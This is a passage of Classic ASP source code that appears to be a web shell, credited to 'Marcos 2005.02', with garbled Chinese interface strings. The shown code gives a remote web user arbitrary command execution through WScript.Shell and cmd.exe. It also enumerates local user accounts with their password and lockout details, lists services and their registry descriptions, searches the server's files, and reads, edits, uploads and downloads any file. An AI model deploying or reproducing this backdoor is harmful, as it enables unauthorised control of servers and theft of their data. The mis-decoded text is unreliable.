           End If

           echo &quot;&lt;style>body{margin:8;border:none;background-color:buttonface;}&lt;/style>&quot;
           echo &quot;&lt;body onload=&quot;&quot;document.forms[0].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);&quot;&quot;>&quot;
           echo &quot;&lt;form method=post onSubmit='this.Submit.disabled=true'>&quot;
           echo &quot;&lt;input type=hidden name=theAct value=doAct>&quot;
           echo &quot;&lt;input type=hidden name=aspPath value=&quot;&quot;&quot; & HtmlEncode(aspPath) & &quot;&quot;&quot;>&quot;
           echo &quot;ËùÔÚÂ·¾¶: &lt;input name=appPath type=text id=appPath value=&quot;&quot;&quot; & HtmlEncode(appPath) & &quot;&quot;&quot; size=62>&lt;br/>&quot;
           echo &quot;³ÌÐòÎÄ¼þ: &lt;input name=appName type=text id=appName value=&quot;&quot;&quot; & HtmlEncode(appName) & &quot;&quot;&quot; size=62> &quot;
           echo &quot;&lt;input type=button name=Submit4 value=' »ØÏÔ ' onClick=&quot;&quot;this.form.appArgs.value+=' > '+this.form.aspPath.value;&quot;&quot;>&lt;br/> &quot;
           echo &quot;ÃüÁî²ÎÊý: &lt;input name=appArgs type=text id=appArgs value=&quot;&quot;&quot; & HtmlEncode(appArgs) & &quot;&quot;&quot; size=62> &quot;
           echo &quot;&lt;input type=submit name=Submit value=' ÔËÐÐ '>&lt;br/>&quot;
           echo &quot;&lt;hr/>×¢: Ö»ÓÐÃüÁîÐÐ³ÌÐòÔÚCMD.EXEÔËÐÐ»·¾³ÏÂ²Å¿ÉÒÔ½øÐÐÁÙÊ±ÎÄ¼þ»ØÏÔ(ÀûÓÃ&quot;&quot;>&quot;&quot;·ûºÅ),ÆäËü³ÌÐòÖ»ÄÜÖ´ÐÐ²»ÄÜ»ØÏÔ.&lt;br/>&quot;
           echo &quot;¡¡&nbsp; ÓÉÓÚÃüÁîÖ´ÐÐÊ±¼äÍ¬ÍøÒ³Ë¢ÐÂÊ±¼ä²»Í¬²½,ËùÒÔÓÐÐ©Ö´ÐÐÊ±¼ä³¤µÄ³ÌÐò½á¹ûÐèÒªÊÖ¶¯Ë¢ÐÂÏÂÃæµÄiframe²ÅÄÜµÃµ½.»ØÏÔºó¼ÇµÃÉ¾³ýÁÙÊ±ÎÄ¼þ.&lt;hr/>&quot;
           echo &quot;&lt;iframe id=cmdResult style='width:100%;height:78%;'>&quot;
           echo &quot;&lt;/iframe>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;/body>&quot;
       End Sub
       Sub PageServiceList()
           Dim sa, objService, objComputer

           showTitle(&quot;ÏµÍ³·þÎñÐÅÏ¢²é¿´&quot;)
           Set objComputer = GetObject(&quot;WinNT://.&quot;)
           Set sa = Server.CreateObject(&quot;Shell.Application&quot;)
           objComputer.Filter = Array(&quot;Service&quot;)

           echo &quot;&lt;ol>&quot;
           If isDebugMode = False Then
               On Error Resume Next
           End If
           For Each objService In objComputer
               echo &quot;&lt;li>&quot; & objService.Name & &quot;&lt;/li>&lt;hr/>&quot;
               echo &quot;&lt;ol>·þÎñÃû³Æ: &quot; & objService.Name & &quot;&lt;br/>&quot;
               echo &quot;ÏÔÊ¾Ãû³Æ: &quot; & objService.DisplayName & &quot;&lt;br/>&quot;
               echo &quot;Æô¶¯ÀàÐÍ: &quot; & getStartType(objService.StartType) & &quot;&lt;br/>&quot;
               echo &quot;ÔËÐÐ×´Ì¬: &quot; & sa.IsServiceRunning(objService.Name) & &quot;&lt;br/>&quot;
   '           echo &quot;µ±Ç°×´Ì¬: &quot; & objService.Status & &quot;&lt;br/>&quot;
   '           echo &quot;·þÎñÀàÐÍ: &quot; & objService.ServiceType & &quot;&lt;br/>&quot;
               echo &quot;µÇÂ¼Éí·Ý: &quot; & objService.ServiceAccountName & &quot;&lt;br/>&quot;
               echo &quot;·þÎñÃèÊö: &quot; & getServiceDsc(objService.Name) & &quot;&lt;br/>&quot;
               echo &quot;ÎÄ¼þÂ·¾¶¼°²ÎÊý: &quot; & objService.Path
               echo &quot;&lt;/ol>&lt;hr/>&quot;
           Next
           echo &quot;&lt;/ol>&lt;hr/>Powered By Marcos 2005.02&quot;

           Set sa = Nothing
       End Sub

       Function getServiceDsc(strService)
           Dim ws
           Set ws = Server.CreateObject(&quot;WScript.Shell&quot;)
           getServiceDsc = ws.RegRead(&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\&quot; & strService & &quot;\Description&quot;)
           Set ws = Nothing
       End Function
       Sub PageTxtSearcher()
           Response.Buffer = True
           Server.ScriptTimeOut = 5000
           Dim keyword, theAct, thePath, theFolder
           theAct = Request(&quot;theAct&quot;)
           keyword = Trim(Request(&quot;keyword&quot;))
           thePath = Trim(Request(&quot;thePath&quot;))

           showTitle(&quot;ÎÄ±¾ÎÄ¼þËÑË÷Æ÷&quot;)

           If thePath = &quot;&quot; Then
               thePath = Server.MapPath(&quot;\&quot;)
           End If

           echo &quot;FSOÎÄ¼þËÑË÷:&quot;
           echo &quot;&lt;hr/>&quot;
           echo &quot;&lt;form name=form1 method=post action=?pageName=TxtSearcher&theAct=fsoSearch onsubmit=this.Submit.disabled=true>&quot;
           echo &quot;Â·¾¶: &lt;input name=thePath type=text value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot; id=thePath size=61>&lt;br/>&quot;
           echo &quot;¹Ø¼ü×Ö: &lt;input name=keyword type=text value=&quot;&quot;&quot; & HtmlEncode(keyword) & &quot;&quot;&quot; id=keyword size=60>&quot;
           echo &quot;&lt;input type=submit name=Submit value=¸øÎÒËÑ>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;hr/>&quot;
           echo &quot;Shell.Application &amp; Adodb.StreamÎÄ¼þËÑË÷:&quot;
           echo &quot;&lt;hr/>&quot;
           echo &quot;&lt;form name=form1 method=post action=?pageName=TxtSearcher&theAct=saSearch onsubmit=this.Submit2.disabled=true>&quot;
           echo &quot;Â·¾¶: &lt;input name=thePath type=text value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot; id=thePath size=61>&lt;br/>&quot;
           echo &quot;¹Ø¼ü×Ö: &lt;input name=keyword type=text value=&quot;&quot;&quot; & HtmlEncode(keyword) & &quot;&quot;&quot; id=keyword size=60>&quot;
           echo &quot;&lt;input type=submit name=Submit2 value=¸øÎÒËÑ>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;hr/>&quot;

           If theAct = &quot;fsoSearch&quot; And keyword &lt;> &quot;&quot; Then
               Set theFolder = fso.GetFolder(thePath)
               Call searchFolder(theFolder, keyword)
               Set theFolder = Nothing
           End If

           If theAct = &quot;saSearch&quot; And keyword &lt;> &quot;&quot; Then
               Call appSearchIt(thePath, keyword)
           End If

           echo &quot;&lt;hr/>Powered By Marcos 2005.02&quot;
       End Sub

       Sub searchFolder(folder, str)
           Dim ext, title, theFile, theFolder
           For Each theFile In folder.Files
               ext = LCase(Split(theFile.Path, &quot;.&quot;)(UBound(Split(theFile.Path, &quot;.&quot;))))
               If InStr(LCase(theFile.Name), LCase(str)) > 0 Then
                   echo fileLink(theFile, &quot;&quot;)
               End If
               If ext = &quot;asp&quot; Or ext = &quot;asa&quot; Or ext = &quot;cer&quot; Or ext = &quot;cdx&quot; Then
                   If searchFile(theFile, str, title, &quot;fso&quot;) Then
                       echo fileLink(theFile, title)
                   End If
               End If
           Next
           Response.Flush()
           For Each theFolder In folder.subFolders
               searchFolder theFolder, str
           Next
       end sub

       Function searchFile(f, s, title, method)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, content, pos1, pos2

           If method = &quot;fso&quot; Then
               Set theFile = fso.OpenTextFile(f.Path)
               content = theFile.ReadAll()
               theFile.Close
               Set theFile = Nothing
            Else
               content = streamLoadFromFile(f.Path)
           End If

           If Err Then
               Err.Clear
               content = &quot;&quot;
           End If

           searchFile = InStr(1, content, S, vbTextCompare) > 0
           If searchFile Then
               pos1 = InStr(1, content, &quot;&lt;TITLE>&quot;, vbTextCompare)
               pos2 = InStr(1, content, &quot;&lt;/TITLE>&quot;, vbTextCompare)
               title = &quot;&quot;
               If pos1 > 0 And pos2 > 0 Then
                   title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
               End If
           End If
       End Function

       Function fileLink(f, title)
           fileLink = f.Path
           If title = &quot;&quot; Then
               title = f.Name
           End If
           fileLink = &quot;&lt;li>&lt;font color=ff0000>&quot; & title & &quot;&lt;/font> &quot; & fileLink & &quot;&lt;/li>&quot;
       End Function

       Sub appSearchIt(thePath, theKey)
           Dim title, extName, objFolder, objItem, fileName
           Set objFolder = sa.NameSpace(thePath)

           For Each objItem In objFolder.Items
               If objItem.IsFolder = True Then
                   Call appSearchIt(objItem.Path, theKey)
                   Response.Flush()
                Else
                   extName = LCase(Split(objItem.Path, &quot;.&quot;)(UBound(Split(objItem.Path, &quot;.&quot;))))
                   fileName = Split(objItem.Path, &quot;\&quot;)(UBound(Split(objItem.Path, &quot;\&quot;)))
                   If InStr(LCase(fileName), LCase(theKey)) > 0 Then
                       echo fileLink(objItem, &quot;&quot;)
                   End If
                   If extName = &quot;asp&quot; Or extName = &quot;asa&quot; Or extName = &quot;cer&quot; Or extName = &quot;cdx&quot; Then
                       If searchFile(objItem, theKey, title, &quot;application&quot;) Then
                           echo fileLink(objItem, title)
                       End If
                   End If
               End If
           Next
       End Sub
       Sub PageUserList()
           Dim objUser, objGroup, objComputer

           showTitle(&quot;ÏµÍ³ÓÃ»§¼°ÓÃ»§×éÐÅÏ¢²é¿´&quot;)
           Set objComputer = GetObject(&quot;WinNT://.&quot;)
           objComputer.Filter = Array(&quot;User&quot;)
           echo &quot;&lt;a href=javascript:showHideMe(userList);>User:&lt;/a>&quot;
           echo &quot;&lt;span id=userList>&lt;hr/>&quot;
           For Each objUser in objComputer
               echo &quot;&lt;li>&quot; & objUser.Name & &quot;&lt;/li>&quot;
               echo &quot;&lt;ol>&lt;hr/>&quot;
               getUserInfo(objUser.Name)
               echo &quot;&lt;hr/>&lt;/ol>&quot;
           Next
           echo &quot;&lt;/span>&quot;

           echo &quot;&lt;br/>&lt;a href=javascript:showHideMe(userGroupList);>UserGroup:&lt;/a>&quot;
           echo &quot;&lt;span id=userGroupList>&lt;hr/>&quot;
           objComputer.Filter = Array(&quot;Group&quot;)
           For Each objGroup in objComputer
               echo &quot;&lt;li>&quot; & objGroup.Name & &quot;&lt;/li>&quot;
               echo &quot;&lt;ol>&lt;hr/>&quot; & objGroup.Description & &quot;&lt;hr/>&lt;/ol>&quot;
           Next
           echo &quot;&lt;/span>&lt;hr/>Powered By Marcos 2005.02&quot;
       End Sub

       Sub getUserInfo(strUser)
           Dim User, Flags
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Set User = GetObject(&quot;WinNT://./&quot; & strUser & &quot;,user&quot;)
           echo &quot;ÃèÊö: &quot; & User.Description & &quot;&lt;br/>&quot;
           echo &quot;ËùÊôÓÃ»§×é: &quot; & getItsGroup(strUser) & &quot;&lt;br/>&quot;
           echo &quot;ÃÜÂëÒÑ¹ýÆÚ: &quot; & cbool(User.Get(&quot;PasswordExpired&quot;)) & &quot;&lt;br/>&quot;
           Flags = User.Get(&quot;UserFlags&quot;)
           echo &quot;ÃÜÂëÓÀ²»¹ýÆÚ: &quot; & cbool(Flags And &H10000) & &quot;&lt;br/>&quot;
           echo &quot;ÓÃ»§²»ÄÜ¸ü¸ÄÃÜÂë: &quot; & cbool(Flags And &H00040) & &quot;&lt;br/>&quot;
           echo &quot;·ÇÈ«¾ÖÕÊºÅ: &quot; & cbool(Flags And &H100) & &quot;&lt;br/>&quot;
           echo &quot;ÃÜÂëµÄ×îÐ¡³¤¶È: &quot; & User.PasswordMinimumLength & &quot;&lt;br/>&quot;
           echo &quot;ÊÇ·ñÒªÇóÓÐÃÜÂë: &quot; & User.PasswordRequired & &quot;&lt;br/>&quot;
           echo &quot;ÕÊºÅÍ£ÓÃÖÐ: &quot; & User.AccountDisabled & &quot;&lt;br/>&quot;
           echo &quot;ÕÊºÅËø¶¨ÖÐ: &quot; & User.IsAccountLocked & &quot;&lt;br/>&quot;
           echo &quot;ÓÃ»§ÐÅÏ¢ÎÄ¼þ: &quot; & User.Profile & &quot;&lt;br/>&quot;
           echo &quot;ÓÃ»§µÇÂ¼½Å±¾: &quot; & User.LoginScript & &quot;&lt;br/>&quot;
           echo &quot;ÓÃ»§HomeÄ¿Â¼: &quot; & User.HomeDirectory & &quot;&lt;br/>&quot;
           echo &quot;ÓÃ»§HomeÄ¿Â¼¸ù: &quot; & User.Get(&quot;HomeDirDrive&quot;) & &quot;&lt;br/>&quot;
           echo &quot;ÕÊºÅ¹ýÆÚÊ±¼ä: &quot; & User.AccountExpirationDate & &quot;&lt;br/>&quot;
           echo &quot;ÕÊºÅÊ§°ÜµÇÂ¼´ÎÊý: &quot; & User.BadLoginCount & &quot;&lt;br/>&quot;
           echo &quot;ÕÊºÅ×îºóµÇÂ¼Ê±¼ä: &quot; & User.LastLogin & &quot;&lt;br/>&quot;
           echo &quot;ÕÊºÅ×îºó×¢ÏúÊ±¼ä: &quot; & User.LastLogoff & &quot;&lt;br/>&quot;
           For Each RegTime In User.LoginHours
               If RegTime &lt; 255 Then
                   Restrict = True
               End If
           Next
           echo &quot;ÕÊºÅÒÑÓÃÊ±¼ä: &quot; & Restrict & &quot;&lt;br/>&quot;
           Err.Clear
       End Sub

       Function getItsGroup(strUser)
           Dim objUser, objGroup
           Set objUser = GetObject(&quot;WinNT://./&quot; & strUser & &quot;,user&quot;)
           For Each objGroup in objUser.Groups
               getItsGroup = getItsGroup & &quot; &quot; & objGroup.Name
           Next
       End Function
       Sub PageWsCmdRun()
           Dim cmdStr, cmdPath, cmdResult
           cmdStr = Request(&quot;cmdStr&quot;)
           cmdPath = Request(&quot;cmdPath&quot;)

           showTitle(&quot;WScript.ShellÃüÁîÐÐ²Ù×÷&quot;)

           If cmdPath = &quot;&quot; Then
               cmdPath = &quot;cmd.exe&quot;
           End If

           If cmdStr &lt;> &quot;&quot; Then
               If InStr(LCase(cmdPath), &quot;cmd.exe&quot;) > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then
                   cmdResult = doWsCmdRun(cmdPath & &quot; /c &quot; & cmdStr)
                Else
                   If LCase(cmdPath) = &quot;wscriptshell&quot; Then
                       cmdResult = doWsCmdRun(cmdStr)
                    Else
                       cmdResult = doWsCmdRun(cmdPath & &quot; &quot; & cmdStr)
                   End If
               End If
           End If

           echo &quot;&lt;style>body{margin:8;}&lt;/style>&quot;
           echo &quot;&lt;body onload=&quot;&quot;document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.height=document.body.clientHeight-115;&quot;&quot;>&quot;
           echo &quot;&lt;form method=post onSubmit='this.Submit.disabled=true'>&quot;
           echo &quot;Â·¾¶: &lt;input name=cmdPath type=text id=cmdPath value=&quot;&quot;&quot; & HtmlEncode(cmdPath) & &quot;&quot;&quot; size=50> &quot;
           echo &quot;&lt;input type=button name=Submit2 value=Ê¹ÓÃWScript.Shell onClick=&quot;&quot;this.form.cmdPath.value='WScriptShell';&quot;&quot;>&lt;br/>&quot;
           echo &quot;ÃüÁî/²ÎÊý: &lt;input name=cmdStr type=text id=cmdStr value=&quot;&quot;&quot; & HtmlEncode(cmdStr) & &quot;&quot;&quot; size=62> &quot;
           echo &quot;&lt;input type=submit name=Submit value=' ÔËÐÐ '>&lt;br/>&quot;
           echo &quot;&lt;hr/>×¢: ÇëÖ»ÔÚÕâÀïÖ´ÐÐµ¥²½³ÌÐò(³ÌÐòÖ´ÐÐ¿ªÊ¼µ½½áÊø²»ÐèÒªÈË¹¤¸ÉÔ¤),²»È»±¾³ÌÐò»áÎÞ·¨Õý³£¹¤×÷,²¢ÇÒÔÚ·þÎñÆ÷Éú³ÉÒ»¸ö²»¿É½áÊøµÄ½ø³Ì.&lt;hr/>&quot;
           echo &quot;&lt;textarea id=cmdResult style='width:100%;height:78%;'>&quot;
           echo HtmlEncode(cmdResult)
           echo &quot;&lt;/textarea>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;/body>&quot;
       End Sub

       Function doWsCmdRun(cmdStr)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim fso, theFile
           Set fso = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)

           doWsCmdRun = ws.Exec(cmdStr).StdOut.ReadAll()
           If Err Then
               echo Err.Description & &quot;&lt;br>&quot;
               Err.Clear
               ws.Run cmdStr & &quot; > &quot; & aspPath, 0, True
               Set theFile = fso.OpenTextFile(aspPath)
               doWsCmdRun = theFile.RealAll()
               If Err Then
                   echo Err.Description & &quot;&lt;br>&quot;
                   Err.Clear
                   doWsCmdRun = streamLoadFromFile(aspPath)
               End If
           End If

           Set fso = Nothing
       End Function
       Sub PageOther()
           echo &quot;&lt;style>&quot;
           echo &quot;A:visited {color: #333333;text-decoration: none;}&quot;
           echo &quot;A:active {color: #333333;text-decoration: none;}&quot;
           echo &quot;A:link {color: #000000;text-decoration: none;}&quot;
           echo &quot;A:hover {color: #333333;text-decoration: none;}&quot;
           echo &quot;BODY {font-size: 9pt;COLOR: #000000;font-family: &quot;&quot;Courier New&quot;&quot;;border: none;background-color: buttonface;}&quot;
           echo &quot;textarea {font-family: &quot;&quot;Courier New&quot;&quot;;font-size: 12px;border-width: 1px;color: #000000;}&quot;
           echo &quot;table {font-size: 9pt;}&quot;
           echo &quot;form {margin: 0;}&quot;
           echo &quot;#fsoDriveList span{width: 100px;}&quot;
           echo &quot;#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}&quot;
           echo &quot;.anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}&quot;
           echo &quot;.font{font-size: 35px;line-height: 40px;}&quot;
           echo &quot;#fileExplorerTools {background-color: buttonFace;}&quot;
           echo &quot;.input {border-width: 1px;}&quot;
           echo &quot;&lt;/style>&quot; & vbNewLine

           echo &quot;&lt;script language=javascript>&quot; & vbNewLine
           echo &quot;function showHideMe(me){&quot; & vbNewLine
           echo &quot;if(me.innerText == ''){&quot; & vbNewLine
           echo &quot;me.innerText = '\nNo Contents!';&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;if(me.style.display == 'none'){&quot; & vbNewLine
           echo &quot;me.style.display = '';&quot; & vbNewLine
           echo &quot;}else{&quot; & vbNewLine
           echo &quot;me.style.display = 'none';&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function changeMyClass(me){&quot; & vbNewLine
           echo &quot;if(me.className == ''){&quot; & vbNewLine
           echo &quot;if(usePath.value != '')document.getElementById(usePath.value).className = '';&quot; & vbNewLine
           echo &quot;usePath.value = me.id;&quot; & vbNewLine
           echo &quot;status = me.title;&quot; & vbNewLine
           echo &quot;me.className = 'anotherSpan';&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function changeThePath(me){&quot; & vbNewLine
           echo &quot;location.href = '?pageName=' + pageName.value + '&thePath=' + me.id;&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function fixTheLayer(strObj){&quot; & vbNewLine
           echo &quot;var objStyle=document.getElementById(strObj).style;&quot; & vbNewLine
           echo &quot;objStyle.width = document.body.clientWidth;&quot; & vbNewLine
           echo &quot;objStyle.top = document.body.scrollTop + 2;&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function openUrl(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=openUrl&thePath=' + usePath.value);&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function newOne(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=newOne&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function editFile(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=showEdit&thePath=' + usePath.value, '', 'menu=no,resizable=yes');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function appDoAction(act){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function downTheFile(){&quot; & vbNewLine
           echo &quot;if(confirm('Èç¹û¸ÃÎÄ¼þ³¬¹ý20M,\n½¨Òé²»ÒªÍ¨¹ýÁ÷·½Ê½ÏÂÔØ\nÕâÑù»áÕ¼ÓÃ·þÎñÆ÷´óÁ¿µÄ×ÊÔ´\n²¢¿ÉÄÜµ¼ÖÂ·þÎñÆ÷ËÀ»ú!\nÄú¿ÉÒÔÏÈ°ÑÎÄ¼þ¸´ÖÆµ½µ±Ç°Õ¾µãÄ¿Â¼ÏÂ,\nÈ»ºóÍ¨¹ýhttpÐÒéÀ´ÏÂÔØ.\n°´\&quot;&quot;È·¶¨\&quot;&quot;ÓÃÁ÷À´½øÐÐÏÂÔØ.')){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=downTheFile&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function appDoAction2(act){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function appTheAttributes(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=theAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function appRename(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=rename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function upTheFile(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=showUpload&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function wsLoadIFrame(){&quot; & vbNewLine
           echo &quot;cmdResult.location.href = '?pageName=SaCmdRun&theAct=readResult';&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function fsoRename(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=showFsoRename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function delOne(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=delOne&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;function fsoGetAttributes(){&quot; & vbNewLine
           echo &quot;newWin = window.open('?pageName=' + pageName.value + '&theAct=getAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=170,width=300');&quot; & vbNewLine
           echo &quot;}&quot; & vbNewLine
           echo &quot;&lt;/script>&quot;
       End Sub
       Sub openUrl(usePath)
           Dim theUrl, thePath

           thePath = Server.MapPath(&quot;/&quot;)

           If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then
               theUrl = Mid(usePath, Len(thePath) + 1)
               theUrl = Replace(theUrl, &quot;\&quot;, &quot;/&quot;)
               If Left(theUrl, 1) = &quot;/&quot; Then
                   theUrl = Mid(theUrl, 2)
               End If
               Response.Redirect(&quot;/&quot; & theUrl)
            Else
               alertThenClose(&quot;ÄúËùÒª´ò¿ªµÄÎÄ¼þ²»ÔÚ±¾Õ¾µãÄ¿Â¼ÏÂ\nÄú¿ÉÒÔ³¢ÊÔ°ÑÒª´ò¿ª(ÏÂÔØ)µÄÎÄ¼þÕ³Ìùµ½\nÕ¾µãÄ¿Â¼ÏÂ,È»ºóÔÙ´ò¿ª(ÏÂÔØ)!&quot;)
               Response.End
           End If
       End Sub

       Sub showEdit(thePath, strMethod)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, unEditableExt

           If Right(thePath, 1) = &quot;\&quot; Then
               alertThenClose(&quot;±à¼ÎÄ¼þ¼Ð²Ù×÷ÊÇ·Ç·¨µÄ.&quot;)
               Response.End
           End If

           unEditableExt = &quot;$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$&quot;

           echo &quot;&lt;style>body{border:none;overflow:hidden;background-color:buttonface;}&lt;/style>&quot;
           echo &quot;&lt;body topmargin=9>&quot;
           echo &quot;&lt;form method=post style='margin:0;width:100%;height:100%;'>&quot;
           echo &quot;&lt;textarea name=fileContent style='width:100%;height:90%;'>&quot;
           If strMethod = &quot;stream&quot; Then
               echo HtmlEncode(streamLoadFromFile(thePath))
            Else
               Set theFile = fso.OpenTextFile(thePath, 1)
               echo HtmlEncode(theFile.ReadAll())
               theFile.Close
               Set theFile = Nothing
           End If
           echo &quot;&lt;/textarea>&lt;hr/>&quot;
           echo &quot;&lt;div align=right>&quot;
           echo &quot;±£´æÎª:&lt;input size=30 name=thePath value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot;> &quot;
           echo &quot;&lt;input type=checkbox name='windowStatus' id=windowStatus&quot;
           If Request.Cookies(m & &quot;windowStatus&quot;) = &quot;True&quot; Then
               echo &quot; checked&quot;
           End If
           echo &quot;>&lt;label for=windowStatus>±£´æºó¹Ø±Õ´°¿Ú&lt;/label> &quot;
           echo &quot;&lt;input type=submit value=' ±£´æ '>&lt;input type=hidden value='saveFile' name=theAct>&quot;
           echo &quot;&lt;input type=reset value=' »Ö¸´ '>&quot;
           echo &quot;&lt;input type=button value=' Çå¿Õ ' onclick=this.form.fileContent.innerText='';>&quot;
           echo strJsCloseMe & &quot;&lt;/div>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;/body>&lt;br/>&quot;

       End Sub

       Sub saveToFile(thePath, strMethod)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim fileContent, windowStatus
           fileContent = Request(&quot;fileContent&quot;)
           windowStatus = Request(&quot;windowStatus&quot;)

           If strMethod = &quot;stream&quot; Then
               streamSaveToFile thePath, fileContent
               chkErr(Err)
            Else
               fsoSaveToFile thePath, fileContent
               chkErr(Err)
           End If

           If windowStatus = &quot;on&quot; Then
               Response.Cookies(m & &quot;windowStatus&quot;) = &quot;True&quot;
               Response.Write &quot;&lt;script>window.close();&lt;/script>&quot;
            Else
               Response.Cookies(m & &quot;windowStatus&quot;) = &quot;False&quot;
               Call showEdit(thePath, strMethod)
           End If
       End Sub

       Sub fsoSaveToFile(thePath, fileContent)
           Dim theFile
           Set theFile = fso.OpenTextFile(thePath, 2, True)
           theFile.Write fileContent
           theFile.Close
           Set theFile = Nothing
       End Sub

       Function streamLoadFromFile(thePath)
           Dim stream
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Set stream = Server.CreateObject(&quot;adodb.stream&quot;)
           With stream
               .Type=2
               .Mode=3
               .Open
               .LoadFromFile thePath
               .LoadFromFile thePath
               If Request(&quot;pageName&quot;) &lt;> &quot;TxtSearcher&quot; Then
                   chkErr(Err)
               End If
               .Charset=&quot;gb2312&quot;
               .Position=2
               streamLoadFromFile=.ReadText()
               .Close
           End With
           Set stream = Nothing
       End Function

       Sub downTheFile(thePath)
           Response.Clear
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim stream, fileName, fileContentType
           fileName = split(thePath,&quot;\&quot;)(uBound(split(thePath,&quot;\&quot;)))
           Set stream = Server.CreateObject(&quot;adodb.stream&quot;)
           stream.Open
           stream.Type = 1
           stream.LoadFromFile(thePath)
           chkErr(Err)
           Response.AddHeader &quot;Content-Disposition&quot;, &quot;attachment; filename=&quot; & fileName
           Response.AddHeader &quot;Content-Length&quot;, stream.Size
           Response.Charset = &quot;UTF-8&quot;
           Response.ContentType = &quot;application/octet-stream&quot;
           Response.BinaryWrite stream.Read
           Response.Flush
           stream.Close
           Set stream = Nothing
       End Sub

       Sub showUpload(thePath, pageName)
           echo &quot;&lt;style>body{margin:8;overflow:hidden;}&lt;/style>&quot;
           echo &quot;&lt;form method=post enctype='multipart/form-data' action='?pageName=&quot; & pageName & &quot;&theAct=upload&thePath=&quot; & UrlEncode(thePath) & &quot;' onsubmit='this.Submit.disabled=true;;'>&quot;
           echo &quot;ÉÏ´«ÎÄ¼þ: &lt;input name=file type=file size=31>&lt;br/>±£´æÎª: &quot;
           echo &quot;&lt;input name=fileName type=text value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot; size=33>&quot;
           echo &quot;&lt;input type=checkbox name=writeMode value=True>¸²¸ÇÄ£Ê½&lt;hr/>&quot;
           echo &quot;&lt;input name=Submit type=submit id=Submit value='ÉÏ ´«' onClick=&quot;&quot;this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;&quot;&quot;>&quot;
           echo  strJsCloseMe
